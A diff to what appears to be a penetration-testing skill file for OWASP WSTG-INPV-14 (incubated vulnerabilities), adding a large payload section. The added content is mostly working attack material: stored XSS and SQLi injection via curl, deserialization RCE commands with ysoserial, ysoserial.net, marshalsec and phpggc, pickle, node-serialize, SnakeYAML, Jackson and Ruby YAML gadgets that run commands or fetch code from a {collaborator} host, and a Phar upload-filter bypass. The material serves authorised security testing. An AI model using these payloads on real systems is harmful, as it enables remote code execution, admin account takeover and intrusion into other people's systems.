@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-inpv-02: "An incubated Stored XSS payload that triggers specifically when viewed in an authenticated admin/back-office context = Critical (Full Admin Account Takeover), rather than a lower-severity self-XSS"
 ---
 
 # wstg-inpv-14
@@ -362,6 +363,217 @@ tester.run_tests()
 
 ---
 
+## Example Commands/Payloads
+
+```bash
+# Plant a uniquely-tagged stored XSS payload, then check where it fires later
+TAG=$(openssl rand -hex 4)
+curl -s -X POST "https://{target}/register" \
+  -d "username=<script>fetch('https://{collaborator}/xss?id=$TAG')</script>" \
+  -d "email=test_$TAG@test.com" -d "password=TestPass123!"
+
+# Plant a stored SQLi payload as a username, trigger it later via login
+curl -s -X POST "https://{target}/register" -d "username=admin'--" -d "password=TestPass123!"
+curl -s -X POST "https://{target}/login" -d "username=admin'--" -d "password=TestPass123!"
+```
+
+| Payload | Trigger Context | Detection Pattern |
+| --- | --- | --- |
+| `<script>fetch('https://{collaborator}/xss?id={tag}')</script>` as username/bio | Admin user list, support ticket view | Callback received on collaborator listener |
+| `admin'--` as username | Login, profile query re-using stored value | SQL error or auth bypass on the later request |
+| `{{config}}` / `${7*7}` in profile fields | Email templates, PDF/report generation | Template evaluated inside the exported report/email |
+
+### Insecure Deserialization as an Incubation Vector
+
+A serialized object stored now (cookie, hidden form field, cache entry, message queue) and deserialized later by a different component (worker, admin tool, another microservice) is a classic incubated vulnerability. First fingerprint the format from raw bytes/base64, then use the matching gadget-chain generator:
+
+| Object Type | Header (Hex) | Header (Base64) | Indicator |
+| --- | --- | --- | --- |
+| .NET ViewState | `FF 01` | `/w` | Hidden `__VIEWSTATE` form field |
+| Java Serialized | `AC ED` | `rO` | Base64-decoded first bytes |
+| PHP Serialized | `4F 3A` | `Tz` | `O:`, `a:`, `s:`, `i:`, `b:` prefixes |
+| Python Pickle | `80 04 95` | `gASV` | Opcodes like `(lp0, S'Test'` when decoded |
+| Ruby Marshal | `04 08` | `BAgK` | `\x04\x08` at start after base64 decode |
+
+```bash
+# Java - generate a gadget chain payload and plant it where it will be deserialized later
+java -jar ysoserial.jar CommonsCollections1 'curl http://{collaborator}' > payload.bin
+curl -s -X POST "https://{target}/api/import" --data-binary @payload.bin -H "Content-Type: application/x-java-serialized-object"
+
+# PHP - object injection gadget chain via phpggc, planted in a cookie/session value read back later
+phpggc monolog/rce1 system 'id' -s
+curl -s "https://{target}/" -b "session_data=O:8:\"Monolog...\""  # paste phpggc output
+
+# Python - pickle payload that executes on next deserialization (e.g. cache/session restore)
+python3 -c "import pickle,os,base64
+class E:
+    def __reduce__(self):
+        return (os.system, ('id',))
+print(base64.b64encode(pickle.dumps(E())).decode())"
+```
+
+Detection: the payload doesn't need to execute immediately — flag the finding once you confirm (a) the app accepts/stores raw serialized data from an untrusted source, and (b) a downstream component (report generator, admin import tool, message consumer) later deserializes it without validation.
+
+### .NET — Formatters and ysoserial.net
+
+Detection: `AAEAAD`/`AAEAAAD` (hex/leading base64) = `BinaryFormatter`; `FF 01` (hex) / `/w` (base64) = ViewState.
+
+```powershell
+# BinaryFormatter (look for System.Runtime.Serialization.Binary.BinaryFormatter, requires [Serializable])
+ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "whoami" -t
+
+# Json.Net (look for JsonConvert.DeserializeObject with TypeNameHandling != None)
+ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe" -t
+
+# LosFormatter (internally uses BinaryFormatter) / classic ASP.NET ViewState
+ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
+
+# XmlSerializer — attacker must control the Type passed to XmlSerializer(typeof(<TYPE>))
+ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"
+
+# NetDataContractSerializer (look for NetDataContractSerializer().ReadObject())
+ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
+```
+
+Plant the generated payload wherever the app deserializes untrusted data later: hidden `__VIEWSTATE` form field, a JSON API body typed with `TypeNameHandling.All`/`Auto`, a cached/session blob read back by another endpoint. `irsdl/ysonet` is an actively-maintained alternative to `ysoserial.net` with the same CLI shape.
+
+### Java — Gadget Chains and Format-Specific Tools
+
+Detection: `AC ED 00 05` (hex) / `rO0` (base64) for native Java serialization; `Content-Type: application/x-java-serialized-object`; `H4sIAAAAAAAAAJ` (gzip+base64).
+
+```bash
+# ysoserial — pick the gadget chain matching libraries on the target's classpath
+java -jar ysoserial.jar CommonsCollections1 'curl http://{collaborator}' > payload.bin
+java -jar ysoserial.jar CommonsCollections6 'id' | base64
+java -jar ysoserial.jar Spring1 'id' > spring.bin
+java -jar ysoserial.jar Groovy1 'id' > groovy.bin
+java -jar ysoserial.jar URLDNS 'http://{collaborator}' > blind.bin   # no gadget deps — confirms deserialization occurs via DNS callback
+
+curl -s -X POST "https://{target}/api/import" --data-binary @payload.bin -H "Content-Type: application/x-java-serialized-object"
+
+# marshalsec — for non-native formats (Jackson, XStream, Kryo, Hessian/Burlap, Castor, JYAML, SnakeYAML, JsonIO, Red5AMF, BlazeDS)
+java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
+java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://{collaborator}/#Exploit" 1389
+```
+
+Common gadget chains: `CommonsCollections1-7`, `CommonsBeanutils1`, `Spring1/2`, `Groovy1`, `Hibernate1/2`, `Jdk7u21`, `JRMPClient`/`JRMPListener`, `ROME`, `Clojure`, `BeanShell1`, `MozillaRhino1/2`, `AspectJWeaver`, `Vaadin1`, `Wicket1`.
+
+YAML (SnakeYAML) gadget:
+
+```yaml
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://{collaborator}/"]
+  ]]
+]
+```
+
+JSON polymorphic deserialization (Jackson `TypeNameHandling`-style, CVE-2017-7525 / CVE-2019-12384 / CVE-2020-9548):
+
+```json
+["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://{collaborator}/inject.sql'"}]
+```
+
+JSF ViewState (Mojarra/MyFaces incubation point): base64 `rO0` = server-object graph, base64+gzip `H4sIAAA` = client-side state; check default MAC/encryption secrets in `org.apache.myfaces.SECRET`/`MAC_SECRET` before assuming the state is protected.
+
+### Node.js — node-serialize / funcster
+
+Detection: search source/`package.json` for `node-serialize`, `serialize-to-js`, or `funcster`.
+
+```json
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://{collaborator}', function(error,stdout,stderr){console.log(stdout)});}()"}
+```
+
+funcster:
+
+```json
+{"rce":{"__js_function":"function(){const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)});}()"}}
+```
+
+### PHP — phpggc Gadgets and Phar Deserialization
+
+```bash
+# phpggc — targets specific frameworks/libraries present in the app
+phpggc monolog/rce1 system 'id' -s
+phpggc laravel/rce9 system 'id' -s
+phpggc symfony/rce4 system 'id' -s
+phpggc guzzlehttp/fw1 /var/www/html/shell.php /tmp/data -s
+```
+
+Phar deserialization triggers `unserialize()` on the Phar's metadata via ANY file-operation function (`file_exists`, `file_get_contents`, `getimagesize`, `md5_file`, `file_get_contents("phar://...")`) — no direct `unserialize()` call is required:
+
+```bash
+curl -s "https://{target}/upload/avatar.php?file=phar://./uploads/evil.jpg"
+```
+
+Craft the file with a phpggc-generated Phar (`-p phar` output flag) or manually via `Phar::setMetadata()`, and disguise it with a valid image magic-byte prefix (e.g. `\xff\xd8\xff`) to bypass upload filters — PHP only requires `__HALT_COMPILER();` at the end of the stub, content before it is unrestricted.
+
+### Python — Pickle and PyYAML
+
+```python
+# pickle __reduce__ gadget (also see the wstg-inpv-18 SSTI skill for related os.system/eval primitives)
+python3 -c "import pickle,os,base64
+class E:
+    def __reduce__(self):
+        return (os.system, ('curl http://{collaborator}',))
+print(base64.b64encode(pickle.dumps(E())).decode())"
+```
+
+```yaml
+# PyYAML unsafe_load / Loader=yaml.UnsafeLoader — the default SafeLoader (PyYAML >= 6.0) is NOT vulnerable
+!!python/object/apply:os.system ["curl http://{collaborator}"]
+!!python/object/apply:subprocess.Popen [["id"]]
+```
+
+Tool: `j0lt-github/python-deserialization-attack-payload-generator` auto-generates payloads for pickle, PyYAML, ruamel.yaml and jsonpickle.
+
+### Ruby — Marshal and YAML.load
+
+```ruby
+# Marshal.load — no cross-version generic gadget; use a chain matching the target's Ruby version (2.0-2.5 script from PATT)
+Marshal.load(["<hex-encoded gadget>"].pack("H*"))
+```
+
+Universal `YAML.load` gadget for Ruby <= 2.7.2 (uses only RubyGems internals, no third-party gems required):
+
+```yaml
+--- !ruby/object:Gem::Requirement
+requirements:
+  !ruby/object:Gem::DependencyList
+  specs:
+  - !ruby/object:Gem::Source::SpecificFile
+    spec: &1 !ruby/object:Gem::StubSpecification
+      loaded_from: "|id 1>&2"
+  - !ruby/object:Gem::Source::SpecificFile
+      spec:
+```
+
+Universal gadget for Ruby 2.x - 3.x:
+
+```yaml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id
+         method_id: :resolve
+```
+
+---
+
 ## Remediation
 
 ```python
@@ -402,6 +614,13 @@ cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
 | **CWE-79** | Cross-Site Scripting |
 | **CWE-89** | SQL Injection        |
 
+
+---
+
+## References
+
+- [OWASP WSTG - WSTG-INPV-14: Testing for Incubated Vulnerability](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability)
+- [PayloadsAllTheThings - Insecure Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
 
 ---
 
